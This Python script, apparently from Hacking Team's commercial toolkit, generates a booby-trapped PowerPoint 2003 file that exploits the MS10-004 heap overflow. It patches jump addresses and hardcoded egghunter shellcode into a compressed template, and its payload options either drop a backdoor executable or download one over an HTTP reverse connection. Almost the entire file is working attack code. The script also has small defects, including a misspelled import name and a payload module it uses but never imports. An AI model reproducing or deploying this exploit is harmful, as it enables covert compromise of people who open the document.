#! /usr/bin/env python

#Copyright HT srl, 2010
#http://www.hackingteam.it/ for more information

#cod

# MS Office PowerPoint 2003 SP3 Heap Overflow Exploit (MS10-004)


import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile

import jscript_unicode
import x86shelldrophttp
import x86int3
import ASCIIHexWhitespace
import x86helloworld

from resources import compessedfile

NAME='Microsoft PowerPoint 2003 SP3'
DESCRIPTION='[+] MS Office PowerPoint 2003 SP3 Heap Overflow Exploit (MS10-004)'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Microsoft'
DOCUMENTATION['Date public']='N/A'
DOCUMENTATION['References']='http://www.microsoft.com/'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Microsoft PowerPoint 2003/SP3'
DOCUMENTATION['CVE']='CVE-????-????'
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-????-????"

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP', 'VISTA', 'SEVEN']
PROPERTY['VENDOR']='Microsoft'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Tested on:
Windows XP Professional SP3 English with Microsoft Office XP/2007
"""

CHANGELOG="""
"""

# Global payload
payload = 0

class exploit():
	def __init__(self, inputFile, outputFile, dbg):
		#self.setInfo(DESCRIPTION)
		self.name=NAME
		self.debugmode = dbg

		self.dest_ppt = outputFile
		self.infile = inputFile
		
		return

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename

	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.infile)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.infile)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	def make_doc(self):
		input = bytearray(zlib.decompress(compressedfile))
		
		egghunter = (b"\x31\xd2"
b"\x66\x81\xca\xff\xff\x42\x83\xc2\x7c\x52\x6a\x02\x58\xcd\x2e\x3c"
b"\x05\x5a\x74\xec\xb8\x41\x90\x41\x90\x89\xd7\xaf\x75\xe8\xaf\x75"
b"\xe5\xff\xe7"
)

		#secondstage = 
		shellcode = self.createShellcode()
		
		offset = 0x84F6
		
		for i in range(0,4):
			input[offset + i] = b"\x00\x35\x13\x00"[i]                      #jump in the stack

		offset = 0x6AE4    
		for i in range(0,4):
			input[offset + i] = b"\x08\x35\x13\x00"[i]                      #jump in the stack
	
		for i in range(0,len(egghunter)):
			input[offset + 4 + i] = egghunter[i]

		offset = 0x1000
		
		for i in range(0,500):
			input[offset + i] = b"\x41\x90"[i%2]                            #egg hunted
		
		for i in range(0,len(shellcode)):
			input[offset + 500 + i] = shellcode[i]

		tmp_bkname = os.path.split(self.dest_ppt)[1]
		
		with warnings.catch_warnings():
			warnings.simplefilter('ignore')

		# Create the output archive
		print "Creating %s zip file archive"%(self.dest_ppt)
			
		f = open(self.dest_ppt,mode='wb')
		f.write(input)
		f.close()

		return 0

	def run(self):
		return self.make_doc()

if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] backdoor output [-debug | -http]"
		sys.exit(0)

	if len(sys.argv) > 2:
		for i in range(2, len(sys.argv)):
			if sys.argv[i] == '-http':
				print "[HTTP] Using HTTP reverse connect to download exe"
				payload = 1
				http = True
			elif sys.argv[i] == '-debug':
				print "[DEBUG] Using INT3 exploit mode"
				dbg = True
			elif sys.argv[i] == '-hello':
				print "[HELLOWORLD] Using HelloWorld payload"
				payload = 2

	if http == False:
		if os.path.isfile(sys.argv[1]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[1])
			sys.exit(0)

		if os.path.getsize(sys.argv[1]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[1])
			sys.exit(0)

		
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)
	
	app=exploit(sys.argv[1], sys.argv[2], dbg)
	app.run()
	
	print ' ... done'